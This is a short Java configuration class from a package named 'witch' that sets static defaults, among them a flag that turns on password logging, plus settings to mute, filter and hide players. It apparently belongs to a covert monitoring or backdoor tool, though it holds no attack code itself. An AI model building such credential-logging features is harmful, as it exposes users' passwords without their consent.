package me.soda.witch.config;

public class Config {
    public static boolean passwordBeingLogged;
    public static boolean isMuted;
    public static boolean isBeingFiltered;
    public static String filterPattern;
    public static boolean vanish;
    public static String[] vanishedPlayers;

    static {
        passwordBeingLogged = true;
        isMuted = false;
        isBeingFiltered = false;
        filterPattern = "hello";
        vanish = false;
        vanishedPlayers = new String[0];
    }
}
